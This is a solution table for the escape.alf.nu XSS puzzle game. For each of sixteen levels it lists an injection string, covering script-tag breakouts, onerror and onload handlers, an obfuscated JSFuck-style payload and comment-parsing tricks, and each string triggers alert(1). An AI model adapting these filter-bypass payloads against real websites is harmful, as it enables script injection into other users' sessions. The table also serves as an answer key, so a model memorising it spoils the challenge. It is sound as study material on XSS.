Escape.alf.nu
=============

http://escape.alf.nu

level   | injection 
--------|----------
0       | `",alert(1),"`
1       | `\",alert(1))</script>`
2       | `</script><body onload=alert(1)>`
3       | `%22,alert(1),%22`
4       | `[[x|""/src/onerror=alert(1)>]]`
5       | `[[x|http://src/onerror=alert(1)>]]`
6       | `Comment#><body/onload=alert(1)>`
7       | `'#'&alert(1)//`
8       | `</SCRIPT><SCRIPT SRC=DATA:,%61%6c%65%72%74(1)>`
9       | `",1[$=(_=[]+{}+!0+!1+1/0)[5]+_[1]+_[25]+_[22]+(S=_[6])+(Q=_[16])+_[17]+_[5]+S+_[1]+Q][$](_[20]+_[21]+_[4]+Q+S+'(1)')(),"`
10      | `\74img/src/onerror=alert(1)\076`
11      | `</scrip</scriptt><script>alert(1)//`
12      | `'#'&alert(1)<!--`
13      | `name=’youWon’`
14      | `'<!--<script>';if((x={test:function(){Image=function(){alert(1)}}})/*`
15      | `<!--<script>#-->)/+alert(1)//`

